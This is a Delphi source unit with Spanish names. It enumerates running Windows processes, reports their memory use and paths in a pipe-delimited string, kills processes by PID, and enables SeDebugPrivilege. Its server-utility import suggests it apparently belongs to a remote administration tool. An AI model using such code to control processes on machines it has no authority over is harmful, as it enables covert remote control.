unit UnitListarProcessos;

interface

uses
  Windows,
  TLhelp32,
  PsAPI;

function ListaDeProcessos: String;
function TerminarProceso(PID: cardinal): Boolean;
function RutaProcesos(PID: DWORD): string;
procedure SetTokenPrivileges;

implementation

uses
  UnitServerUtils;

function GetProcessMemoryUsage(PID: cardinal): Cardinal;
var
  l_nWndHandle, l_nProcID, l_nTmpHandle: HWND;
  l_pPMC: PPROCESS_MEMORY_COUNTERS;
  l_pPMCSize: Cardinal;
begin
  result := 0;
  l_pPMCSize := SizeOf(PROCESS_MEMORY_COUNTERS);
  GetMem(l_pPMC, l_pPMCSize);
  l_pPMC^.cb := l_pPMCSize;
  l_nTmpHandle := OpenProcess(PROCESS_ALL_ACCESS, False, PID);
  try
    if (GetProcessMemoryInfo(l_nTmpHandle, l_pPMC, l_pPMCSize)) then
    Result := l_pPMC^.WorkingSetSize else Result := 0;
    except
  end;
  FreeMem(l_pPMC);
end;

function ListaDeProcessos: String;
var
  Proceso : TProcessEntry32;
  ProcessHandle : THandle;
  HayOtroProceso   : Boolean;
begin
  SetTokenPrivileges;
  Result := '';
  Proceso.dwSize := SizeOf(TProcessEntry32);
  ProcessHandle := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if Process32First(ProcessHandle, Proceso) then
  begin
    Result:= String(Proceso.szExeFile) + '|' +
             IntToStr(Proceso.th32ProcessID) + '|' +
             inttostr(GetProcessMemoryUsage(Proceso.th32ProcessID)) + '|' +
             string(RutaProcesos(Proceso.th32ProcessID)) + '|' + #13#10;
    repeat
      HayOtroProceso := Process32Next(ProcessHandle, Proceso);

      if HayOtroProceso then
      Result:= result + String(Proceso.szExeFile) + '|' +
                        IntToStr(Proceso.th32ProcessID) + '|' +
                        inttostr(GetProcessMemoryUsage(Proceso.th32ProcessID)) + '|' +
                        string(RutaProcesos(Proceso.th32ProcessID)) + '|' + #13#10;

    until not HayOtroProceso;
  end;
  CloseHandle(ProcessHandle);
end;

procedure SetTokenPrivileges;
var
  hToken1, hToken2, hToken3: THandle;
  TokenPrivileges: TTokenPrivileges;
  Version: OSVERSIONINFO;
begin
  Version.dwOSVersionInfoSize := SizeOf(OSVERSIONINFO);
  GetVersionEx(Version);
  if Version.dwPlatformId <> VER_PLATFORM_WIN32_WINDOWS then
  begin
    try
      OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, hToken1);
      hToken2 := hToken1;
      LookupPrivilegeValue(nil, 'SeDebugPrivilege', TokenPrivileges.Privileges[0].luid);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken1, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      TokenPrivileges.PrivilegeCount := 1;
      TokenPrivileges.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      hToken3 := 0;
      AdjustTokenPrivileges(hToken2, False, TokenPrivileges, 0, PTokenPrivileges(nil)^, hToken3);
      CloseHandle(hToken1);
    except;
    end;
  end;
end;

function TerminarProceso(PID: cardinal): Boolean;
var
  ProcessHandle : THandle;
begin
  SetTokenPrivileges;
  try
    ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    if TerminateProcess(ProcessHandle ,0) then
    Result := True
    except
    Result := False;
  end;
end;

function StrLen(tStr:PChar):integer;
begin
  result := 0;
  while tStr[Result] <> #0 do
  inc(Result);
end;

function RutaProcesos(PID: DWORD): string;
var
Handle: THandle;
begin
  Result := ' ';
  Handle := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, PID);
  if Handle <> 0 then
  try
    SetLength(Result, MAX_PATH);
    begin
      if GetModuleFileNameEx(Handle, 0, PChar(Result), MAX_PATH) > 0 then
      SetLength(Result, StrLen(PChar(Result)))
      else
      Result := ' ';
    end
    finally
    CloseHandle(Handle);
  end;
end;

end.
